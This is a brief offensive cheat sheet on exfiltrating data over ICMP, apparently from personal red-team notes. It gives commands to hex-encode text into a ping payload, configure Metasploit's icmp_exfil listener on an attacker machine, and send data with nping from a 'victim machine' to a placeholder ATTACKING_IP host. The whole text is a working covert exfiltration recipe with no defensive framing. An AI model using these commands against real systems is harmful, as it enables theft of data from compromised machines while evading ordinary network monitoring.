
```Shell
echo "Ali Alaqoul" | xxd -p
ping 1.2.3.4 -c 1 -p 416c6920416c61716f756c0a
```


ICMP Listner (MSFCONSOLE)
```MSF
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKING_IP
set INTERFACE eth0
run
```


From the victim machine, exfilterate using nping
```Shell
sudo nping --icmp -c 1 ATTACKING_IP --data-string "victim_file.txt"
```
